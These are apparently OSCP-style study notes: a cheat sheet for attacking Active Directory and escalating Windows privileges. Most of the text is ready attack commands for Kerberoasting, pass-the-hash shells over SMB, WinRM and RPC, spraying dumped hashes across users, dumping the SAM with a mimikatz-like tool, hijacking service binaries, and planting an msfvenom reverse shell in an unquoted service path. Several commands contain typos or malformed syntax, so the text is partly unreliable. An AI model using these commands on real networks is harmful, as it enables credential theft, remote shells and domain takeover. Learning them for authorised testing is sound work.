# Active Directory
- https://www.youtube.com/watch?v=E6okxaSTl7M 
- Scan all TCP ports.
 Check LDAP, RPC, SMB with anonymous access. Check for public share.
- Find usernames. If you get access, look for usernames with things like nxc --rid-brute, --users, and enumdomuser with rpcclient to get list of users in domain without needing initial credentials. Check usernames with kerbrute.
- Test for ASREProasting after you have a username and password.
- Try authenticating with every possible protocol with those set of credentials: winrm, rdp, smb, rpc, ldap, etc
- Enumerate shares for every user you get access to. Every NEW user means you should recheck their shares.
- If you have share write access, upload a Evil Windows Library File, listen with Responder
- If you get shell as a user, check for privsec, and dump all hashes and collect them in a file for possible bruteforcing and lateral movement.
- Run BloodHound and check for basic attacks like DCsync. Check for other paths bloodhound may find.
- Check for dual homed machines, use ligolo-ng.
- Try brute forcing different protocols as you collect credentials. Remember to use NTLM authentication.
- Check UDP ports
- Re-scan if you get stuck and verify tools are working.

# Window Privesc
- Run PowerUp, then WinPEAS
- . .\PowerView.ps1; Invoke-AllChecks
- .\winPEASany.exe
- This will give you all info you need. Save output to a file and go over it slowly.
 
# Specific Techniques
## Kerberroast
.\Rubeus.exe kerberroast /outfile:hashes.txt    # windows
impacket-GetUserSPNs -dc-ip ip "my.domain/user:pass" -request

## Pass the Hash PtH / Get shell
Over SMB
impacket-psexec oscp.exam/administrator@192.168.1.1 -hashes :NTLM_HASH

Over WinRM TCP 5985/5986
evil-winrum -u Administraotr -H 'hash' -i 192.168.1.1 

Over RPC
impacket-wmiexec oscp.exam/administrator@192.168.1.1 -hashes :NTLM_HASH
impacket-wmiexec oscp.exam/administrator@192.168.1.1 -hashes LM_HASH:NTLM_HASH

## Clean up creds/hashes
awk 'NF {print $1}` dumped_hashes.txt | sort | uniq | tee unique_hashes.txt
john unique_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT

## bruteforce all hashes against all users
nxc smb 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
nxc winrm 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
nxc ldap 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success
nxc wmi 192.168.1.1 -u users.txt -H unique_hashes.txt --continue-on-success

mk.exe "privilege::debug" "lsadump::sam" "exit"

## Windows services
services
sc.exe config VMTools binPath="c:\Users\myuser\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools


### Insecure Service Permissions
accesschk64.exe /accepteula -uwcqv daclsvc
accesschk64.exe /accepteula -uwqd "C:\Program Files\Unquoted Path Service\"
msfvenom -p windows/x64_shell_reverse_tcp LHOST=IP LPORT=443 -f exe > common.exe
copy c:\users\myusers\common.exe "C:\Program Files\Unquoted Path Service\common.exe"
sc.exe start  unquotedSVC 
